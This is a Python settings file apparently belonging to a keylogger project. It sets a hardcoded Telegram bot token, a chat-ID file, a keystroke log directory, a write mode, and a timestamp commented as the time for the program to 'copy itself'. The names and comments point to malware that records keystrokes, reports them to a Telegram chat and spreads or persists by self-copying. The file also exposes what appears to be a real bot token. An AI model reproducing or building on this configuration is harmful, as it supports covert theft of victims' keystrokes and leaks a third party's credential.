
'''
This document contains all sensible data
that will vary between devices. Change as you please.

'''

# BotFather bot token
'''
To initialize the bot follow these steps:
https://blog.devgenius.io/how-to-set-up-your-telegram-bot-using-botfather-fd1896d68c02
'''
TOKEN = "5782793062:AAFIFmeNfS-0z7cw4KmrAs4EBqShWddN2zE"

# Setting up pytelegrambotapi to work with your telegram account
'''
You need to remove the commented line "bot.polling()" inside
TBot.py. This function lets the bot listen for any messages like
/start. Sending this message after running the script will register
your chat ID in the path specified below()
'''
ChatIDPath = "C:/Users/angel/Desktop/KeyLogger/IDS/ChatID.txt"  # "/ChatID.txt"

# Writing to documents
'''
If the file isn't created in the current directory you may
have to create it manualy(make sure to add the path leading to
the directory where the file is stored)or change the current
settings from "a" (append) to "w"(write) and back. Leaving
"w" setting will overwrite anything written in the .txt file.
'''
LogDir = "C:/Users/angel/Desktop/KeyLogger/logs/"  # "/logs/"
logFuncMode = "w"

# DateTime to copy itself

dt = "2023-01-18 07:21:00,3500"
